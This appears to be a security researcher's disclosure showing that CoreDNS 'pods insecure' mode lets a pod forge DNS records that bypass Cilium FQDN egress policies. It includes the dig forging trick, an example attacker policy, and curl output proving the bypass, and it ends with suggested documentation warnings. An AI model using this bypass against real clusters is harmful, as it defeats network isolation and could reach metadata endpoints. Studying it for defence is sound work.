I was digging around in CoreDNS and found that most k8s clusters, today,
run with `pods insecure` options which let's you forge arbitrary DNS A records,
like so (namespace has to exist):

```bash
$ dig +short 169-254-169-254.default.pod.cluster.local
169.254.169.254
```

This is [documented behavior](https://coredns.io/plugins/kubernetes/). Even
though `pods verified` exists, I was not able to find a cluster that uses it.

Then the other part of my brain took over and thought how to use this in an
attack, today, and I came up with the following setup:

```yaml
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: limit-gh-api
  namespace: attacker
spec:
  endpointSelector:
    matchLabels:
      app: attacker
  egress:
    # Rule 1: Allow DNS resolution (Required for FQDN rules to work)
    - toEndpoints:
      - matchLabels:
          "k8s:io.kubernetes.pod.namespace": kube-system
          k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
          rules:
            dns:
              - matchPattern: "*"
    # Rule 2: Allow internal traffic only, or...?
    - toFQDNs:
        - matchPattern: "**.cluster.local"
      toPorts:
        - ports:
            - port: "443"
              protocol: TCP
            - port: "80"
              protocol: TCP
```

Now, you can do arbitrary hole punching, if `pods insecure` is enabled,
to get external network access (from a pod in the `attacker` namespace).
For example to `185.60.217.35` which is `facebook.com`:

```bash
root@ubuntu-attacker:/# curl https://185.60.217.35 -k -v
*   Trying 185.60.217.35:443...
^C
root@ubuntu-attacker:/# dig +short 185-60-217-35.default.pod.cluster.local
185.60.217.35
root@ubuntu-attacker:/# curl https://185.60.217.35 -k -v
*   Trying 185.60.217.35:443...
* Connected to 185.60.217.35 (185.60.217.35) port 443
```

because Ciliums keeps an internal cache as allow list

```
laborant@node-01:~$ kubectl -n kube-system exec cilium-78j6l -- cilium fqdn cache list
Endpoint   Source       FQDN                                       TTL   ExpirationTime             IPs             
177        connection   185-60-217-35.default.pod.cluster.local.   0     2026-04-02T15:06:40.832Z   185.60.217.35 
```

I know there are a lot of ways to write network policies, but as a security
progessional I find this to be highly unexpected & suprising behavior.

I'm not sure if a code change is necessary or even possible, but Cilium could do two things: 

1) add a warning to the documentation and warn about this interaction
2) test for `pods insecure` and emit a warning linking back to the aforementioned docs
